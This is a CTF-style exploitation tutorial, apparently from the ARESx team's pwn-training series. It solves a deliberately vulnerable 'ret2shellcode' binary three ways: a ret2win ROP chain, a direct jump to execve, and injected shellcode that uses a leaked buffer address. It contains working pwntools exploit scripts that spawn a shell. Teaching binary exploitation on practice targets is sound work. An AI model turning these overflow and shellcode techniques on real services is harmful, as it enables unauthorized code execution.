---
layout: post
author: tourpran
title: Return to Shellcode
categories: pwn-training
tags: ["ret2shellcode", "ret2win"]
---

### Introduction:

This is an initiative taken by team members of ARESx. In this series of `pwn-training` we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will start of slow with a simple return to shellcode challenge. Most of the challenge binary's code will also be provided.

### Challenge:

Here we are given a binary and the source for the binary.

[vuln binary](/assets/images/pwntraining1/ret2shellcode) and 
[vuln c code](/assets/images/pwntraining1/ret2shellcode.c)

### Solution:

#### Mitigations: 

Before going into the exploitation its better to check what mitigations are enabled for a bianry. Mitigations are protections that were included to avoid certain attacks. For example.
```bash
checksec --file ./ret2shellcode
```

![](/assets/images/pwntraining1/pwntrain1.png)

If you don't have checksec installed then 
```bash
sudo apt install checksec
```

RELRO:
* Partial RELRO - in attackers point of view, does nothing but leaves the got writeable.
* Full RELRO    - makes the GOT read-only therefore mitigating the "got-overwrite" attack. (got-overwrite coming soon ;) )

CANARY:
* its a set of characters stored on the stack to make sure no buffer overflows takes place. (we can bypass this later)

No eXecute:
* NX Enabled - this makes sure that the code on the stack is not excecuted.(not that simple but lets go with this for now)
* NX Disabled - yea you guessed it. the code on the stack can be excecuted. 

PIE:
* position independent excecutable: will randomise the address of the code and PLT.
* point to note : the libc address will always be different cause they are PIC (Position Independent Code). Even they dont know where they are laoded lmao.

RWX:
* Read, write and execute : It'll tell us if the binary has segments that we can write and excecute.

#### Code walkthrough:

IF you are a curious assembly code lover make sure to head over to the gdb and dig deep. Here I'll go through the c code since its a basic writeup.

![](/assets/images/pwntraining1/pwntrain2.png)

Just ignore the ignore_me() function its for standard buffering and stuff. There are 2 functions called win and main. looking at main we see there is a buf variable with size 0x60 and a puts call. There is also a printf that will leak the address of the buf variable [intresting].

There is another function called gets(). we all at this point know its a dangerous function. lets see why.
```bash
man gets
```
![](/assets/images/pwntraining1/pwntrain3.png)

seems like gets will take input as long as there is a newline character which means we can get past the buf variable and mess things in the ``stack``. So this stack is just a memory region where all the static allocations happen. lets open this in gdb and see what is happening.

I have a different version / flavour of gdb called pwndbg. [link to download](https://github.com/pwndbg/pwndbg)

```gdb
disass main
```
![](/assets/images/pwntraining1/pwntrain4.png)

I know a lot of shit is happening but dont worry we only want to set a break point in the return at the end. These breakpoints are stops that'll happen at specific address that you define when you run the binary in gdb. 

```gdb
b* 0x0000000000401238
```
b for break and give the address of ret at the end of main. Now run the binary and see if you can crash it in someway. Go ahead and see if oyu can get some crash in the binary. 

Great if you got a ``segfault`` else no worries. well do it together. run the binary in gdb with `r` and then give 0x60 "a"s . this will fill up the buf variable. after those random "a"s maybe create a offset pattern like `111111112222222233333333`.
* Segfault - its caused because our program is trying to read a part of memory thats invalid in this case it tried to jump to the address ``22222222``

![](/assets/images/pwntraining1/pwntrain5.jpg)

ooof dont worry. there is a lot of information about different registers in the image but we are particularly intrested in 1 register called rsp. The rsp is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want. 

#### Aim: 

As an attacker our aim is to make this binary give a shell for us in the server. So we looked at a win() function earlier, this will land us a nice neat shell! Tho there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server. 

#### Return to win:

now since we control the return address of main why not lets change the return address to win function?
* Win function does execve("/bin/sh") -> which means that it'll call a system function called `execve` and excecute the command `/bin/sh` which is a shell.

ok lets start writing our script in python. First we will import pwntools library to make things easier. next we will connect to our binary and send/recieve messages.

```python
from pwn import *

p = process("ret2shellcode")
p.sendline(b"a"*0x60 + b"a"*8 + p64(0x00000000004011a5))
p.interactive()
```

Here in the sendline command I am giving "a" * 0x60 to fill the buf variable and extra "a" * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ? -> p64() function will make your address into little endian format.

Run this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?   

![](/assets/images/pwntraining1/pwntrain6.png)

You can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some additional checks done to the `execve`.

![](/assets/images/pwntraining1/pwntrain7.png)

So we have to somehow make the arg1 = 0xdeadbeef and arg2 = 0xcafebabe. This is where return oriented programming comes into picture. 

##### Return Oriented Programming:

This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that'll do something valuable to us.

* Since win is a function with arg1 and arg2 as parameters. We have to know that the parameters to a function is given through registers and specifically by RDI, RSI, RDX for the first, second, and third arguments respectively.
* so we can set RDI = 0xdeadbeef and RSI = 0xcafebabe. then call win function.

#### Exploit [ret2win]: 

Firstly we can get all the gadgets in the binary with [ROPgadget](https://github.com/JonathanSalwan/ROPgadget). Then lets take out the ones that we want.

```bash
python3 ROPgadget.py --binary ../Documents/pwn-train/pwn1/ret2shellcode
```

![](/assets/images/pwntraining1/pwntrain8.png)

add the gadgets in the list and then give the values then call win function. HOORAY !!!

```python
from pwn import *

p = process("ret2shellcode")
pause()
p.sendline(b"a"*0x60 + b"a"*8 + p64(0x000000000040129b) + p64(0xdeadbeef) + p64(0x0000000000401299) + p64(0xcafebabe) + p64(0) + p64(0x00000000004011a5))
p.interactive()

```
![](/assets/images/pwntraining1/pwntrain9.png)

#### Exploit [simpler version]: 

I know you went through all the struggle to set the arguments right. But if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function. 

```python
from pwn import *

p = process("ret2shellcode")
p.sendline(b"a"*0x60 + b"a"*8 + p64(0x00000000004011d1)) # address to execve
p.interactive()
```

#### return 2 shellcode:

This is the third and final way that well discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. this time ignore the win() function. without the help of helper function get a shell yourself :D . 

Remember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.

* first step is to store the leak in a variable. We will use recvline function here.
* write all the commands that you want to excecute (pwntools has inbuilt functionalities :D )
* fill the gap between the return and the shellcode (shellcode -> all the commands to be excecuted )
* jump back to buf variable.

```python
#!/usr/bin/env python3
from pwn import *

def start():
	global p
	if args.REMOTE:
		p = remote('localhost', 1337)
	else:
		p = elf.process() # start the process.

context.binary = elf = ELF('./ret2shellcode') 
start()

buf_addr = int(p.recvlines(2)[-1].split()[-1], 16) # recvlines and then get the leak

payload = asm(shellcraft.linux.sh()) # generates a shellcode compatible with linux systems
payload += b'\x90'*(104 - len(payload)) # spans the gap between buf variable and return 
payload += p64(buf_addr) # address of the buf variable

p.sendline(payload) # send the payload

p.interactive() # doesnt close the shell and keeps it open for us.
p.close()
```

Hope you liked the pwn training 1. More training writeups coming soon ! :D 